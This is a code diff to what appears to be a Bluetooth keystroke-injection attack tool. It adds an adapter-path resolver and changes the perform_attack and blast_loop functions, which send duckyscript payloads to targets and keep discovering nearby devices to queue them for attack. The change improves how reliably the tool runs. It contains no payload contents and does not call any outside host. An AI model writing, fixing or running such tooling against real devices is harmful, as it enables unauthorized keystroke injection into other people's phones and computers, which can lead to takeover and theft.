@@ -634,12 +634,40 @@ def setup_and_connect(connection_manager, target_address, adapter_id):
     establish_connections(connection_manager)
     return connection_manager.clients[19]
 
+def get_adapter_path(bus, adapter_id):
+    """Dynamically resolve the adapter path to avoid KeyErrors."""
+    try:
+        # Try primary path
+        path = f"/org/bluez/{adapter_id}"
+        obj = bus.get("org.bluez", path)
+        if obj: return path
+    except:
+        pass
+    
+    # Fallback: Search managed objects
+    try:
+        mngr = bus.get("org.bluez", "/")
+        objs = mngr.GetManagedObjects()
+        for path, interfaces in objs.items():
+            if "org.bluez.Adapter1" in interfaces:
+                if adapter_id in path:
+                    return path
+        # Last resort: return first available adapter
+        for path, interfaces in objs.items():
+            if "org.bluez.Adapter1" in interfaces:
+                return path
+    except:
+        pass
+    return f"/org/bluez/{adapter_id}" # Default back
+
 def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False, name="Unknown"):
     """Encapsulates the attack logic for a single target."""
     try:
         log.info(f"Targeting: {name} ({target_address})")
-        adapter = setup_bluetooth(target_address, adapter_id)
-        adapter.enable_ssp()
+        bus = SystemBus()
+        adapter_path = get_adapter_path(bus, adapter_id)
+        adapter = bus.get("org.bluez", adapter_path)
+        adapter.Pairable = True
         
         current_line = 0
         current_position = 0
@@ -710,7 +738,8 @@ def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, 
                 queue.append((addr, name))
         
         # Start persistent discovery for new targets
-        adapter_obj = bus.get("org.bluez", f"/org/bluez/{adapter_id}")
+        adapter_path = get_adapter_path(bus, adapter_id)
+        adapter_obj = bus.get("org.bluez", adapter_path)
         adapter_obj.StartDiscovery()
         
         while True:
